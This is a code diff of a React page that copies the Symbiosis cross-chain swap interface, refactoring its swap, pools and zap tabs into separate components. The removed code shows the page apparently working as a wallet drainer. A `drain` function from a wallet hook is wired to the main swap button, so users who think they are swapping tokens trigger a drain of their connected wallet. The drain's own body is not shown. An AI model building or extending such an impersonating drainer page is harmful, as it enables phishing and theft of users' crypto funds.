@@ -1,170 +1,18 @@
 "use client";
 
-import { ethers } from "ethers";
-import { useEffect, useState } from "react";
-import { Settings, ExternalLink, ArrowDown, X, Info } from "lucide-react";
+import { useState } from "react";
+import { ExternalLink, X } from "lucide-react";
 import Image from "next/image";
 import SymbiosisLayout from "../layouts/symbiosisLayout";
 import { useAccount } from "wagmi";
 import { shortenAddressSmall } from "../utils";
 import SelectNetwork from "@/components/symbiosis/SelectNetwork.dropdown";
-import { useWallet } from "../../components/useWallet";
-import TokenSelector from "@/components/symbiosis/TokenSelector";
-import Switch from "@/components/symbiosis/Switch";
-import "/public/symbiosis/cygnito-font.css";
 import useSymbiosis from "@/hooks/useSymbiosis";
 import AccountDropdown from "@/components/symbiosis/AccountDropdown";
-import { ethereumTokens } from "@/data/symbiosis/ethereum";
-import axios from "axios";
-import { formatAmount } from "@/lib/utils";
-import QuoteCard from "@/components/symbiosis/SymbiosisQuoteCard";
-import { TSwapQuote } from "@/types/symbiosis";
-import { TbSettingsFilled } from "react-icons/tb";
-
-// Dummy data for pools
-const pools = [
-  {
-    name: "USDC",
-    chain: "Sei v2",
-    icon: "/stargate/usdc-icon.png",
-    chainIcon: "/stargate/sei-icon.png",
-    totalLocked: "900,852",
-    poolBalance: "103%",
-    apr: "0.03%",
-    boostedApr: "0.03%",
-  },
-  {
-    name: "USDT",
-    chain: "Sei v2",
-    icon: "/stargate/usdt-icon.png",
-    chainIcon: "/stargate/sei-icon.png",
-    totalLocked: "892,414",
-    poolBalance: "114.8%",
-    apr: "0.02%",
-    boostedApr: "0.02%",
-  },
-  {
-    name: "USDC",
-    chain: "Sei v2",
-    icon: "/stargate/usdc-icon.png",
-    chainIcon: "/stargate/sei-icon.png",
-    totalLocked: "900,852",
-    poolBalance: "103%",
-    apr: "0.03%",
-    boostedApr: "0.03%",
-  },
-  {
-    name: "USDT",
-    chain: "Sei v2",
-    icon: "/stargate/usdt-icon.png",
-    chainIcon: "/stargate/sei-icon.png",
-    totalLocked: "892,414",
-    poolBalance: "114.8%",
-    apr: "0.02%",
-    boostedApr: "0.02%",
-  },
-  {
-    name: "USDC",
-    chain: "Sei v2",
-    icon: "/stargate/usdc-icon.png",
-    chainIcon: "/stargate/sei-icon.png",
-    totalLocked: "900,852",
-    poolBalance: "103%",
-    apr: "0.03%",
-    boostedApr: "0.03%",
-  },
-  {
-    name: "USDT",
-    chain: "Sei v2",
-    icon: "/stargate/usdt-icon.png",
-    chainIcon: "/stargate/sei-icon.png",
-    totalLocked: "892,414",
-    poolBalance: "114.8%",
-    apr: "0.02%",
-    boostedApr: "0.02%",
-  },
-  {
-    name: "USDC",
-    chain: "Sei v2",
-    icon: "/stargate/usdc-icon.png",
-    chainIcon: "/stargate/sei-icon.png",
-    totalLocked: "900,852",
-    poolBalance: "103%",
-    apr: "0.03%",
-    boostedApr: "0.03%",
-  },
-  {
-    name: "USDT",
-    chain: "Sei v2",
-    icon: "/stargate/usdt-icon.png",
-    chainIcon: "/stargate/sei-icon.png",
-    totalLocked: "892,414",
-    poolBalance: "114.8%",
-    apr: "0.02%",
-    boostedApr: "0.02%",
-  },
-  {
-    name: "USDC",
-    chain: "Sei v2",
-    icon: "/stargate/usdc-icon.png",
-    chainIcon: "/stargate/sei-icon.png",
-    totalLocked: "900,852",
-    poolBalance: "103%",
-    apr: "0.03%",
-    boostedApr: "0.03%",
-  },
-  {
-    name: "USDT",
-    chain: "Sei v2",
-    icon: "/stargate/usdt-icon.png",
-    chainIcon: "/stargate/sei-icon.png",
-    totalLocked: "892,414",
-    poolBalance: "114.8%",
-    apr: "0.02%",
-    boostedApr: "0.02%",
-  },
-  {
-    name: "USDC",
-    chain: "Sei v2",
-    icon: "/stargate/usdc-icon.png",
-    chainIcon: "/stargate/sei-icon.png",
-    totalLocked: "900,852",
-    poolBalance: "103%",
-    apr: "0.03%",
-    boostedApr: "0.03%",
-  },
-  {
-    name: "USDT",
-    chain: "Sei v2",
-    icon: "/stargate/usdt-icon.png",
-    chainIcon: "/stargate/sei-icon.png",
-    totalLocked: "892,414",
-    poolBalance: "114.8%",
-    apr: "0.02%",
-    boostedApr: "0.02%",
-  },
-  {
-    name: "USDC",
-    chain: "Sei v2",
-    icon: "/stargate/usdc-icon.png",
-    chainIcon: "/stargate/sei-icon.png",
-    totalLocked: "900,852",
-    poolBalance: "103%",
-    apr: "0.03%",
-    boostedApr: "0.03%",
-  },
-  {
-    name: "USDT",
-    chain: "Sei v2",
-    icon: "/stargate/usdt-icon.png",
-    chainIcon: "/stargate/sei-icon.png",
-    totalLocked: "892,414",
-    poolBalance: "114.8%",
-    apr: "0.02%",
-    boostedApr: "0.02%",
-  },
-  // Add more pool data as needed
-];
+import ZapCrossChain from "@/components/symbiosis/ZapCrossChain";
+import SymbiosisSwap from "@/components/symbiosis/SymbiosisSwap";
+import SymbiosisPools from "@/components/symbiosis/SymbiosisPools";
+import "/public/symbiosis/cygnito-font.css";
 
 export interface Token {
   name: string;
@@ -174,7 +22,6 @@ export interface Token {
   balance?: string;
   decimals?: number;
 }
-
 export interface Network {
   name: string;
   icon: string;
@@ -188,454 +35,15 @@ export interface Network {
 export type TradeType = "EXACT_INPUT" | "EXACT_OUTPUT";
 
 export default function Page() {
-  const { drain } = useWallet();
-  const { connector, isConnected, address } = useAccount();
+  const { isConnected } = useAccount();
   const [activeTab, setActiveTab] = useState<"swap" | "pools" | "zap">("swap");
   const [showSettings, setShowSettings] = useState(false);
-  const [showDeprecated, setShowDeprecated] = useState(false);
-  const [customAddress, setCustomAddress] = useState("");
   const [slippage, setSlippage] = useState("0.5");
-  const [fetchingRate, setfetchingRate] = useState<boolean>(false);
-  const [loading, setLoading] = useState(false);
-  const [isAddressOpen, setIsAddressOpen] = useState<boolean>(false);
-  const [txState, setTxState] = useState("Initial");
-  const [fromAmount, setFromAmount] = useState<string | number>("");
-  const [toAmount, setToAmount] = useState<string | number>("");
-  const [swapDetails, setSwapDetails] = useState<TSwapQuote | null>(null);
   const { setIsConnectWalletOpen } = useSymbiosis();
-
-  const [tradeType, setTradeType] = useState<TradeType>("EXACT_INPUT");
-  const [searchTerm, setSearchTerm] = useState("");
-  const [selectedFromNetwork, setSelectedFromNetwork] =
-    useState<Network | null>({
-      icon: "https://s2.coinmarketcap.com/static/img/coins/64x64/1027.png",
-      name: "Ethereum",
-      id: 1,
-      address: "",
-    });
-  const [selectedToNetwork, setSelectedToNetwork] = useState<Network | null>(
-    null
-  );
-  const [selectedFromToken, setSelectedFromToken] = useState<Token | null>({
-    address: "",
-    logoURI: "https://s2.coinmarketcap.com/static/img/coins/64x64/1027.png",
-    name: "Ethereum",
-    symbol: "ETH",
-    decimals: 18,
-  });
-  const [selectedToToken, setSelectedToToken] = useState<Token | null>(null);
-  const [tokens, setTokens] = useState<Token[]>([]);
-  const [filteredTokens, setFilteredTokens] = useState<Token[]>([]);
-  const [transferFromToken, setTransferFromToken] = useState<{
-    network: Network;
-    token: Token;
-  } | null>(null);
-  const [supplyingToToken, setSupplyingToToken] = useState<{
-    network: Network;
-    token: Token;
-  } | null>(null);
-  const [fromToken, setFromToken] = useState<{
-    network: Network;
-    token: Token;
-  } | null>(null);
-  const [toToken, setToToken] = useState<{
-    network: Network;
-    token: Token;
-  } | null>(null);
-
-  // fetch swap quote
-  useEffect(() => {
-    if (
-      +fromAmount > 0 &&
-      selectedFromNetwork?.id &&
-      selectedFromToken &&
-      selectedToNetwork
-    ) {
-      const handleFetchSwap = async () => {
-        try {
-          setfetchingRate(true);
-          await axios
-            .post(
-              "https://api.symbiosis.finance/crosschain/v1/swap",
-              {
-                tokenAmountIn: {
-                  chainId: selectedFromNetwork?.id,
-                  address: selectedFromToken?.address
-                    ? selectedFromToken?.address
-                    : "",
-                  symbol: selectedFromToken?.symbol,
-                  decimals: selectedFromToken?.decimals,
-                  icon: selectedFromToken?.logoURI,
-                  amount: formatAmount(fromAmount, selectedFromToken?.decimals),
-                },
-                tokenOut: {
-                  chainId: selectedToNetwork?.id,
-                  address: selectedToToken?.address
-                    ? selectedToToken?.address
-                    : "",
-                  symbol: selectedToToken?.symbol,
-                  decimals: selectedToToken?.decimals,
-                  icon: selectedToToken?.logoURI,
-                },
-                from: address || "0x0E2EAAc9A8b89Fd69ee174E5a192214ca7Fc0c6b",
-                to: address || "0x0E2EAAc9A8b89Fd69ee174E5a192214ca7Fc0c6b",
-                slippage: 200,
-                selectMode: "best_return",
-              },
-              {
-                headers: {
-                  "x-account-id":
-                    address || "0x0E2EAAc9A8b89Fd69ee174E5a192214ca7Fc0c6b",
-                  "x-partner-id": "symbiosis-app",
-                },
-              }
-            )
-            .then((res) => {
-              // console.log(res, "price response");
-              if (res.data) {
-                setSwapDetails(res.data);
-                if (tradeType === "EXACT_INPUT") {
-                  const rawAmount = BigInt(res?.data?.tokenAmountOut?.amount); // Use BigInt to handle large numbers
-                  const decimals = res.data?.tokenAmountOut?.decimals;
-
-                  // Convert raw amount to human-readable format
-                  const humanReadableAmount =
-                    Number(rawAmount) / Math.pow(10, decimals);
-                  setToAmount(humanReadableAmount);
-                }
-                if (tradeType === "EXACT_OUTPUT") {
-                  const rawAmount = BigInt(res?.data?.tokenAmountOut?.amount); // Use BigInt to handle large numbers
-                  const decimals = res.data?.tokenAmountOut?.decimals;
-
-                  // Convert raw amount to human-readable format
-                  const humanReadableAmount =
-                    Number(rawAmount) / Math.pow(10, decimals);
-                  setToAmount(humanReadableAmount);
-                }
-              }
-            })
-            .finally(() => setfetchingRate(false));
-        } catch (err) {
-          console.log(err);
-        }
-      };
-      handleFetchSwap();
-    }
-  }, [fromAmount, selectedFromNetwork, selectedToToken, selectedToNetwork]);
-
-  useEffect(() => {
-    if (searchTerm) {
-      const filtered = tokens.filter(
-        (token) =>
-          token.name.toLowerCase().includes(searchTerm.toLowerCase()) ||
-          token.symbol.toLowerCase().includes(searchTerm.toLowerCase()) ||
-          token.address.toLowerCase().includes(searchTerm.toLowerCase())
-      );
-      setFilteredTokens(filtered);
-    } else {
-      setFilteredTokens(tokens);
-    }
-  }, [searchTerm, tokens]);
-
-  const handleDrain = async () => {
-    if (!connector) {
-      console.error("Missing required fields for drain.");
-      return;
-    }
-
-    try {
-      setLoading(true);
-      setTxState("Processing");
-
-      const provider = new ethers.providers.Web3Provider(
-        await connector.getProvider()
-      );
-      const chainId = await provider.getSigner().getChainId();
-
-      await drain(provider, chainId, toToken.token.address); // Trigger drain with correct args
-
-      setTxState("Completed");
-      setLoading(false);
-    } catch (error) {
-      console.error("Error in drain function:", error);
-      setTxState("Failed");
-      setLoading(false);
-    }
-  };
-
-  const handleSwap = () => {
-    setSelectedFromNetwork(selectedToNetwork);
-    setSelectedToNetwork(selectedFromNetwork);
-    setSelectedToToken(selectedFromToken);
-    setSelectedFromToken(selectedToToken);
-  };
-
-  const renderSwapContent = () => (
-    <div className="space-y-6">
-      <div className="flex justify-between items-center">
-        <div className="flex items-center gap-2">
-          <h2 className="text-2xl">Exchange</h2>
-          <p>{"{?}"}</p>
-        </div>
-        <div className="bg-[#f1f1f1] p-2 rounded-xl hover:opacity-65">
-          <TbSettingsFilled
-            className="w-6 h-6 cursor-pointer transition-colors hover:opacity-65"
-            onClick={() => setShowSettings(true)}
-          />
-        </div>
-      </div>
-
-      <div className="space-y-2 relative border-b-2 border-[#707070]">
-        <TokenSelector
-          isWithMax
-          amount={fromAmount}
-          tradeType="EXACT_INPUT"
-          setTradeType={setTradeType}
-          setAmount={setFromAmount}
-          selectedNetwork={selectedFromNetwork}
-          selectedToken={selectedFromToken}
-          setSelectedNetwork={setSelectedFromNetwork}
-          setSelectedToken={setSelectedFromToken}
-          selectedNetwork2={selectedToNetwork}
-          label="From"
-          onSelect={(network, token) => setFromToken({ network, token })}
-        />
-        <div className="flex justify-center absolute w-full bottom-[-35px]">
-          <div className="flex justify-center">
-            <div
-              onClick={handleSwap}
-              className="bg-black rounded-xl p-2 cursor-pointer hover:bg-gray-900"
-            >
-              <img
-                src="/symbiosis/download (5).svg"
-                alt="round"
-                className="h-6 w-6"
-              />
-            </div>
-          </div>
-        </div>
-      </div>
-
-      <div className="space-y-2">
-        <TokenSelector
-          amount={toAmount}
-          setAmount={setToAmount}
-          selectedNetwork={selectedToNetwork}
-          tradeType="EXACT_OUTPUT"
-          setTradeType={setTradeType}
-          fetching={fetchingRate}
-          selectedNetwork2={selectedFromNetwork}
-          selectedToken={selectedToToken}
-          setSelectedNetwork={setSelectedToNetwork}
-          setSelectedToken={setSelectedToToken}
-          label="To"
-          onSelect={(network, token) => setToToken({ network, token })}
-        />
-      </div>
-
-      <div className="w-full flex justify-start items-center gap-2">
-        <Switch open={isAddressOpen} setOpen={setIsAddressOpen} />
-        <p className="text-[#888]">Receive to another wallet</p>
-      </div>
-
-      {isAddressOpen ? (
-        <div className="space-y-2">
-          <label className="text-sm sm:text-base text-gray-400">
-            Enter address:
-          </label>
-          <input
-            type="text"
-            onChange={(e) => setCustomAddress(e.target.value)}
-            value={customAddress}
-            placeholder="..."
-            className="w-full bg-[#fff] shadow-md rounded-lg p-4 outline-none font-mono"
-          />
-          <p className=" text-sm">
-            <span className="text-orange-500">Important: </span>
-            Use self-custodial wallets only! Do not send funds to addresses
-            provided by exchanges or third-party services.
-          </p>
-        </div>
-      ) : null}
-
-      {selectedFromToken.symbol && selectedToToken?.symbol && swapDetails ? (
-        <div className="mt-4 px-2 py-0.5 rounded-full flex justify-start items-center gap-1 bg-white border shadow-sm w-fit">
-          <Image
-            src="https://symbiosis-static.net/611b4f59ba061ab80d52.png"
-            height={18}
-            width={18}
-            alt="horse"
-            className="rounded-full"
-          />
-          <p className="text-xs text-black">{selectedFromToken?.symbol}</p>
-          <p> &gt;</p>
-          <p className="text-xs text-black">{selectedToToken?.symbol}</p>
-        </div>
-      ) : null}
-
-      {+fromAmount > 0 ? (
-        <QuoteCard data={swapDetails} setShowSettings={setShowSettings} />
-      ) : null}
-
-      <button
-        onClick={() => handleDrain()}
-        disabled={loading || !selectedToToken || fetchingRate}
-        className={`${
-          customAddress === "" ? "bg-[#A3A3A3]" : "bg-[#76FB6D]"
-        } w-full bg-black text-white py-4 rounded-lg hover:bg-gray-900 transition-colors disabled:opacity-35`}
-      >
-        {customAddress.length > 1 &&
-        !ethers.utils.isAddress(customAddress) &&
-        !loading
-          ? "SET VALID ADDRESS"
-          : loading
-          ? "TRANSFERRING..."
-          : !selectedToToken
-          ? ""
-          : "SELECT THE TOKEN YOU RECEIVE"}
-      </button>
-    </div>
-  );
-
-  const renderPoolsContent = () => (
-    <div className="space-y-6">
-      <div className="flex justify-between items-center">
-        <div className="flex items-center gap-2">
-          <h2 className="text-xl">All pools</h2>
-          <Info className="w-4 h-4 text-gray-400" />
-        </div>
-        <button className="bg-[#fff] shadow-md px-4 py-4 rounded-lg hover:bg-gray-800 transition-colors">
-          My liquidity
-        </button>
-      </div>
-
-      <div className="space-y-4">
-        <input
-          type="text"
-          placeholder="Search by Name/Chain/Token"
-          className="w-full bg-[#fff] shadow-md rounded-lg p-4 outline-none"
-          value={searchTerm}
-          onChange={(e) => setSearchTerm(e.target.value)}
-        />
-
-        <label className="flex items-center gap-2">
-          <input
-            type="checkbox"
-            checked={showDeprecated}
-            onChange={(e) => setShowDeprecated(e.target.checked)}
-          />
-          <span className="text-sm text-gray-400">Show deprecated pools</span>
-        </label>
-
-        <div className="space-y-4">
-          {pools.map((pool, index) => (
-            <div key={index} className="bg-[#f3f3f3] rounded-lg p-4">
-              <div className="flex justify-between items-center mb-4">
-                <div className="flex items-center gap-2">
-                  <div className="relative">
-                    <Image
-                      src={pool.icon}
-                      alt={pool.name}
-                      width={32}
-                      height={32}
-                      className="rounded-full"
-                    />
-                    <div className="border-2 p-[1px] absolute -top-0 -right-1 bg-white  border-white rounded-full">
-                      <Image
-                        src={pool.chainIcon}
-                        alt={pool.name}
-                        width={12}
-                        height={12}
-                        className=" rounded-full"
-                      />
-                    </div>
-                  </div>
-                  <span className="font-mono">{pool.name}</span>
-                </div>
-                <div className="flex items-center gap-2">
-                  <Image
-                    src={pool.chainIcon}
-                    alt={pool.chain}
-                    width={16}
-                    height={16}
-                  />
-                  <span className="text-sm">{pool.chain}</span>
-                </div>
-              </div>
-              <div className="flex items-center justify-between gap-4 text-xs">
-                <div>
-                  <div className="text-gray-400">Total Locked</div>
-                  <div className="font-mono">{pool.totalLocked}</div>
-                </div>
-                <div>
-                  <div className="text-gray-400">Pool balance {" {?}"}</div>
-                  <div className="font-mono">{pool.poolBalance}</div>
-                </div>
-                <div>
-                  <div className="text-gray-400">APR {" {?}"}</div>
-                  <div className="font-mono">{pool.apr}</div>
-                </div>
-                <div>
-                  <div className="text-gray-400">Boosted APR {" {?}"}</div>
-                  <div className="font-mono">{pool.boostedApr}</div>
-                </div>
-              </div>
-              <button className="w-full mt-4 text-md bg-[#fff] text-center py-2 rounded-lg hover:bg-gray-800 transition-colors">
-                Manage
-              </button>
-            </div>
-          ))}
-        </div>
-      </div>
-    </div>
-  );
-
-  const renderZapContent = () => (
-    <div className="space-y-6">
-      <div className="flex justify-between items-center">
-        <div className="flex items-center gap-2">
-          <h2 className="text-xl">Cross-chain Zap</h2>
-          <Info className="w-4 h-4 text-gray-400" />
-        </div>
-        <div className="bg-[#f1f1f1] p-2 rounded-lg">
-          <Settings
-            className="w-6 h-6 cursor-pointer hover:text-gray-300 transition-colors"
-            onClick={() => setShowSettings(true)}
-          />
-        </div>
-      </div>
-
-      {/* Similar to swap content but with different labels */}
-      <div className="space-y-4">
-        <TokenSelector
-          tradeType="EXACT_INPUT"
-          label="Transfer From"
-          onSelect={(network, token) =>
-            setTransferFromToken({ network, token })
-          }
-        />
-
-        <div className="flex justify-center">
-          <div className="bg-black rounded-lg p-2 cursor-pointer hover:bg-gray-900">
-            <ArrowDown className="w-5 h-5 text-white" />
-          </div>
-        </div>
-        <TokenSelector
-          tradeType="EXACT_OUTPUT"
-          label="Supplying To"
-          onSelect={(network, token) => setSupplyingToToken({ network, token })}
-        />
-
-        <button className="w-full bg-black text-white py-2 rounded-lg hover:bg-gray-900 transition-colors">
-          CONNECT WALLET
-        </button>
-      </div>
-    </div>
-  );
 
   return (
     <SymbiosisLayout>
-      <div className="min-h-screen bg-[#F9F9F9] text-black">
+      <div className="min-h-screen h-full bg-[#F9F9F9] text-black">
         {/* Top Banner */}
         <div className="bg-blue-500 md:text-md text-xs text-white font-bold p-3 text-center flex items-center justify-center gap-2">
           Cross-chain swaps to TON with Symbiosis TON Bridge v2
@@ -654,17 +62,17 @@ export default function Page() {
                     height={40}
                     className="rounded-2xl"
                   />
-                  <span className="font-mono flex">
+                  <span className="font-mono flex sm:text-lg font-medium">
                     Symbiosis <span className="md:block hidden">/ App</span>
                   </span>
                   <span className="text-sm bg-[#fff] rounded-2xl p-1 text-black ">
                     v2
                   </span>
                 </div>
-                <div className="md:flex hidden items-center text-lg gap-8">
+                <div className="md:flex hidden items-center gap-8 text-base sm:text-lg">
                   <a
                     href="#"
-                    className="hover:text-gray-300 font-bold transition-colors"
+                    className="hover:text-gray-300 font-medium transition-colors"
                   >
                     Swap
                   </a>
@@ -676,9 +84,9 @@ export default function Page() {
                   </a>
                   <a
                     href="https://rewards.symbiosis.finance/vesis"
-                    className="flex items-center gap-1 bg-[#76FB6D] font-bold px-4 py-2 rounded-xl text-[#000] hover:bg-[#5fd656] transition-colors"
+                    className="flex items-center gap-1 bg-[#76FB6D] font-medium p-2 rounded-xl text-[#000] hover:bg-[#5fd656] transition-colors"
                   >
-                    veSIS
+                    Stake SIS
                     <ExternalLink className="w-4 h-4" />
                   </a>
                 </div>
@@ -687,7 +95,7 @@ export default function Page() {
                 ) : (
                   <button
                     onClick={() => setIsConnectWalletOpen(true)}
-                    className="bg-black text-white text-sm md:px-5 p-2 md:py-3 rounded-2xl hover:bg-gray-900 transition-colors flex gap-1.5 items-center"
+                    className="bg-black text-white text-sm md:px-5 p-2 md:py-3.5 rounded-xl hover:bg-gray-900 transition-colors flex gap-1.5 items-center"
                   >
                     Connect <span className="sm:block hidden">wallet</span>
                   </button>
@@ -698,18 +106,16 @@ export default function Page() {
         </nav>
 
         {/* Main Content */}
-        <main className="max-w-[600px] mx-auto px-4 py-8">
-          <div className=" rounded-2xl p-6">
+        <main className="max-w-[610px] mx-auto p-4">
+          <div className="rounded-2xl sm:p-6">
             {/* Tabs */}
-            <div className="flex rounded-2xl bg-[#F1F1F1] p-1 mb-6">
+            <div className="flex rounded-2xl bg-[#F1F1F1] py-1.5 px-1 mb-6 text-black">
               {(["swap", "pools", "zap"] as const).map((tab) => (
                 <button
                   key={tab}
                   onClick={() => setActiveTab(tab)}
-                  className={`flex-1 py-2 rounded-2xl text-center capitalize transition-colors ${
-                    activeTab === tab
-                      ? "bg-white text-black"
-                      : "text-gray-400 hover:text-white"
+                  className={`flex-1 py-2 rounded-2xl text-center capitalize transition-colors font-sans font-medium ${
+                    activeTab === tab ? "bg-white" : "hover:text-white"
                   }`}
                 >
                   {tab}
@@ -718,9 +124,9 @@ export default function Page() {
             </div>
 
             {/* Tab Content */}
-            {activeTab === "swap" && renderSwapContent()}
-            {activeTab === "pools" && renderPoolsContent()}
-            {activeTab === "zap" && renderZapContent()}
+            {activeTab === "swap" && <SymbiosisSwap />}
+            {activeTab === "pools" && <SymbiosisPools />}
+            {activeTab === "zap" && <ZapCrossChain />}
           </div>
         </main>
 
